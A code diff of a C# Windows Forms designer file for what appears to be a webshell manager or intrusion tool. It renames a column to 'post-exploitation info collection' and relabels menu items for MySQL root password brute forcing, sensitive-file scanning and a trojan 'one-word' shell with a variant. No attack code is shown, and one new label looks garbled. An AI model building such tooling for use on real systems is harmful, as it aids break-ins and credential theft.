@@ -92,7 +92,7 @@
             this.lvType = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lvStatus = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lvVersion = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
-            this.lvDB = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.lvInfoCollection = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lvIP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lvCountry1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.lvCountry2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -546,15 +546,15 @@
             // passwdBlastingMenuItem
             // 
             this.passwdBlastingMenuItem.Name = "passwdBlastingMenuItem";
-            this.passwdBlastingMenuItem.Size = new System.Drawing.Size(199, 22);
-            this.passwdBlastingMenuItem.Text = "Mysql之root密码爆破";
+            this.passwdBlastingMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.passwdBlastingMenuItem.Text = "mysql K令";
             this.passwdBlastingMenuItem.Click += new System.EventHandler(this.WeakPasswdBlastingMenuItem_Click);
             // 
             // sensitiveFileScanMenuItem
             // 
             this.sensitiveFileScanMenuItem.Name = "sensitiveFileScanMenuItem";
-            this.sensitiveFileScanMenuItem.Size = new System.Drawing.Size(199, 22);
-            this.sensitiveFileScanMenuItem.Text = "本地敏感文件素描";
+            this.sensitiveFileScanMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.sensitiveFileScanMenuItem.Text = "文件素描";
             this.sensitiveFileScanMenuItem.Click += new System.EventHandler(this.LocalSensitiveFileScanMenuItem_Click);
             // 
             // proxySettingMenu
@@ -578,7 +578,7 @@
             this.lvType,
             this.lvStatus,
             this.lvVersion,
-            this.lvDB,
+            this.lvInfoCollection,
             this.lvIP,
             this.lvCountry1,
             this.lvCountry2});
@@ -635,10 +635,10 @@
             this.lvVersion.Text = "客户端版本";
             this.lvVersion.Width = 143;
             // 
-            // lvDB
+            // lvInfoCollection
             // 
-            this.lvDB.Text = "数据库配置";
-            this.lvDB.Width = 77;
+            this.lvInfoCollection.Text = "后信息收集";
+            this.lvInfoCollection.Width = 77;
             // 
             // lvIP
             // 
@@ -726,7 +726,7 @@
         private System.Windows.Forms.ToolStripMenuItem EnterToolStripMenuItem;
         private System.Windows.Forms.ToolStripLabel settingMenu;
         private System.Windows.Forms.ColumnHeader lvPass;
-        private System.Windows.Forms.ColumnHeader lvDB;
+        private System.Windows.Forms.ColumnHeader lvInfoCollection;
         private System.Windows.Forms.ToolStripDropDownButton trojanMenu;
         private System.Windows.Forms.ToolStripMenuItem OneWordToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem 变种1ToolStripMenuItem;
